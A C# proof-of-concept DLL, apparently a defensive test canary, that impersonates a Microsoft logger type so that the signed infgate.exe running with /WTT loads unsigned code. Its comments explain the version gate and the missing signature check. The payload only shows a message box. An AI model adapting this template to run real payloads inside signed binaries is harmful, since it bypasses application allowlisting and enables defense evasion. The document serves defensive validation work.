using System;
using System.Runtime.InteropServices;

// The file version must satisfy infgate's WTT loader gate: major > 2, or
// major == 2 and minor >= 2. 3.0.0.0 clears it.
[assembly: System.Reflection.AssemblyVersion("3.0.0.0")]
[assembly: System.Reflection.AssemblyFileVersion("3.0.0.0")]
[assembly: System.Reflection.AssemblyProduct("INFGate /WTT defensive validation canary")]

// infgate reflectively instantiates the fixed type
// "Microsoft.DistributedAutomation.Logger.TestLogger" with a single string
// constructor argument. Only this namespace + type name + constructor shape are
// required; the assembly's own identity, name, and signature are NOT checked
// (this file compiles under an unrelated name and is renamed to
// Microsoft.Wtt.Log.dll). The constructor body is attacker-controlled code.
namespace Microsoft.DistributedAutomation.Logger
{
    public sealed class TestLogger
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int MessageBoxW(IntPtr hWnd, string text, string caption, uint type);

        public TestLogger(string loggerArguments)
        {
            // Benign proof only: display a message box from inside the signed host.
            // No persistence, networking, credential access, or system modification.
            MessageBoxW(
                IntPtr.Zero,
                "Unsigned DLL executed inside Microsoft-signed infgate.exe via /WTT.",
                "LOLBAS Defensive Validation",
                0);
        }
    }
}
